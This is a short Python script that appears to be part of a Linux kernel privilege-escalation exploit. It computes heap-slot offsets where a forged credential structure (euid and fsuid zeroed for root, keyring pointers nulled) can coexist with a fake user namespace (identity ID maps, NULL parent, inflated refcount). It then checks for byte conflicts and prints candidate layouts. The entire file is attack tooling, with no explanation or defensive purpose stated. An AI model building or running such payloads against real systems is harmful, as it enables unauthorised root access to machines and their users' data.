# ns in O (direct part) + spillover into the uniform neighbour pattern;
# cred also lives in the uniform pattern at slot offset v.
WLO, WHI = 0x18, 0xf8
TOK = ('tok',)          # runtime pointer / self pointer (nonzero, distinct)

def cred_req(v):
    r = {}
    r[v+0x00] = TOK                       # usage = low32(V), nonzero
    r[v+0x01] = TOK; r[v+0x02] = TOK; r[v+0x03] = TOK
    for i,b in enumerate((0x80,0xff,0xff,0xff)):   # uid = 0xffffff80
        r[v+0x04+i] = b
    r[v+0x14] = 0                          # euid
    r[v+0x1c] = 0                          # fsuid
    for i in range(8):                     # 4 keyring ptrs = 0
        r[v+0x58+i] = 0
    for p in range(5):                     # security,user,user_ns,ucounts,group_info
        for i in range(8):
            r[v+0x78+8*p+i] = ('ptr',p,i)
    return r

def ns_hard(u):
    out = []
    out.append((u+0x00, [1,0,0,0]))                       # uid_map.nr_extents
    out.append((u+0x08, [0,0,0,0]))                       # extent.first
    out.append((u+0x0c, [0,0,0,0]))                       # lower_first
    out.append((u+0x10, [1,0,0,0]))                       # count
    out.append((u+0x48, [1,0,0,0]))                       # gid_map.nr_extents
    out.append((u+0x50, [0,0,0,0]))
    out.append((u+0x54, [0,0,0,0]))
    out.append((u+0x58, [1,0,0,0]))
    out.append((u+0xd8, [0]*8))                           # parent = NULL
    out.append((u+0x104, [0x00,0x00,0x00,0x40]))          # ns.count = 0x40000000
    out.append((u+0x210, [0]*8))                          # ucounts = NULL
    return out

def try_layout(u, v):
    req = cred_req(v)
    if max(req) >= WHI: return None
    free = set(range(WLO,WHI)) - set(req)
    for (a, bs) in ns_hard(u):
        for i,b in enumerate(bs):
            g = a+i
            s = g & 0xff
            if g < 0x100:
                if not (WLO <= s < WHI): return ('O-unwritable %#x' % g)
            else:
                if not (WLO <= s < WHI): return ('F-unwritable %#x->%#x' % (g,s))
            if s in req:
                if req[s] != b: return ('conflict %#x' % g)
            else:
                req[s] = b; free.discard(s)
    # timer field zone in O (must not matter: final edit is after the collect)
    wins=[]
    for k in range(14):
        a = WLO+16*k
        det = [req.get(a+i) for i in range(16)]
        nf = sum(1 for x in det if x is None)
        if nf == 0:
            if all(x==0 for x in det): wins.append((a,'ZERO'))
            else: wins.append((a,'FIX'))
        else: wins.append((a,'FREE'))
    zeros = [a for a,t in wins if t=='ZERO']
    if len(zeros) > 1: return ('zeros=%d' % len(zeros))
    seen=set()
    for (a,t) in wins:
        if t!='FIX': continue
        sig = tuple(req.get(a+i) for i in range(16))
        if sig in seen: return 'dup'
        seen.add(sig)
    return ('OK', zeros, [ (hex(a),t) for a,t in wins ])

res=[]
for v in range(0x18,0x49,8):
    for u in range(0x18,0xe9,8):
        r = try_layout(u,v)
        if r and r[0]=='OK': res.append((v,u,r))
print("candidates:", len(res))
import collections
c = collections.Counter((v,u) for v,u,_ in res)
for v,u,r in res[:40]:
    print("v=%#x u=%#x zeros=%s" % (v,u,[hex(x) for x in r[1]]))
if not res:
    # show failure histogram for a few
    hist = collections.Counter()
    for v in range(0x18,0x49,8):
        for u in range(0x18,0xe9,8):
            r = try_layout(u,v)
            hist[r[0][:12] if isinstance(r[0],str) else r ] += 1
    for k,n in hist.most_common(12): print(n,k)
